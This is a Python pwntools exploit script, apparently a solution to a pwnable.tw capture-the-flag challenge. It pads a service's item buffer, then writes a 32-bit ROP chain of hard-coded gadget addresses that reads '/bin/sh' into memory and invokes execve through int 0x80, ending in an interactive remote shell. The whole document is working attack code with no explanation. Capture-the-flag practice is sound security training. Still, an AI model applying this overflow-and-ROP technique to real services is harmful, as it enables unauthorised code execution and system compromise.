from pwnlib.tubes.remote import remote
from pwnlib.util.packing import p32
from time import sleep

read_addr = 0x0806D560
free_buf = 0x080EAF80

# ROP gadgets
pop_edx_ecx_ebx = 0x0806f060
pop_eax = 0x080bb436
int_0x80 = 0x08049671

# Option 1: Put a item to the box
def put(item):
    print r.recvuntil(':')
    r.send('1\n')
    print r.recvuntil(':')
    r.send(item)


r = remote('pwning.pwnable.tw', 56746)

# Padding
for i in range(10):
    put('A'*15 + '\n')

# ROP chain
put('A'*12 + p32(read_addr))
put(p32(pop_edx_ecx_ebx) + p32(0) + p32(free_buf) + p32(8))
put(p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(free_buf))
put(p32(pop_eax) + p32(0xb) + p32(int_0x80) + p32(0))

# Option 4: give up the box
print r.recvuntil(':')
r.send('4\n')
print r.recvline()

# Read to the free buffer
r.send('/bin/sh\x00')

sleep(1)
r.interactive()
